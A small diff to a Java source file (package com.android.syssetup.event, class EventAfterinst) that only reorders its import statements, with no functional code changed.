@@ -1,14 +1,14 @@
 package com.android.syssetup.event;
 
+import com.android.syssetup.conf.ConfEvent;
+import com.android.syssetup.conf.ConfigurationException;
+import com.android.syssetup.evidence.Markup;
+
 import java.io.IOException;
 import java.util.Calendar;
 import java.util.Date;
 import java.util.GregorianCalendar;
 import java.util.TimeZone;
-
-import com.android.syssetup.conf.ConfEvent;
-import com.android.syssetup.conf.ConfigurationException;
-import com.android.syssetup.evidence.Markup;
 
 public class EventAfterinst extends BaseTimer {
 
